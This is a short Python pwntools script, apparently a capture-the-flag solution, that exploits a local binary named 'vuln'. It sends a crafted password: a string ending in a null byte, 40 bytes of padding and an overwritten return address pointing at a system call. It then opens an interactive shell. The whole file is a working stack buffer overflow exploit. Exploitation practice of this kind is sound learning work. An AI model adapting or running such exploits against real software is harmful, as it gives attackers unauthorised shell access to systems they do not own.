from pwn import *
from time import sleep

PROCESS_NAME = 'vuln'
SYSTEM_ADDRESS = 0x400EA6
PASSWORD = 'todo: ldap and kerberos support\x00' + 40*'A' + p64(SYSTEM_ADDRESS)

def main():
	p = process(PROCESS_NAME)
	p.recv(1024, timeout=1)

	p.sendline('aaa')

	p.recv(1024, timeout=1)

	p.sendline(PASSWORD)
	p.recvline()
	p.recvline()

	p.interactive()

if __name__ == '__main__':
	main()

 